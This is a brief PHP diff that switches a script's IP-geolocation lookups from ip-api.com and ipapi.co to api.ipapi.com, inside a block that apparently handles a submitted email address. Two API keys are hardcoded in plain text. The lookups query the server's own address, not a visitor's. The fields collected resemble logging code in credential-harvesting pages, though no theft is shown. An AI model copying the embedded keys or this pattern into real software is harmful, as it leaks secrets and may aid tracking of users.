@@ -40,25 +40,25 @@ $pp = $_GET['country_calling_code'];
 $linky = $_SERVER['HTTP_HOST'];
 if($email){
 $api_key = "26dc150b1cf3c41dc866400812300e6d";
-$cty1 = file_get_contents("http://ip-api.com/json");
+$cty1 = file_get_contents("http://api.ipapi.com/check?access_key=3230fcc0de8ef60aba3a5b3bb81a6432&format=1");
 $jsondata = json_decode($cty1);
-$cty = $jsondata->country;
+$cty = $jsondata->country_name;
 
-$ipp = file_get_contents("http://ip-api.com/json");
+$ipp = file_get_contents("http://api.ipapi.com/check?access_key=3230fcc0de8ef60aba3a5b3bb81a6432&format=1");
 
 
 $jsondata = json_decode($ipp);
 
 
-$ipp = $jsondata->query;
+$ipp = $jsondata->ip;
 
-$pp = file_get_contents("https://ipapi.co/json");
+$pp = file_get_contents("http://api.ipapi.com/check?access_key=3230fcc0de8ef60aba3a5b3bb81a6432&format=1");
 
 
 $jsondata = json_decode($pp);
 
 
-$pp = $jsondata->country_calling_code;
+$pp = $jsondata->calling_code;
     
     
 
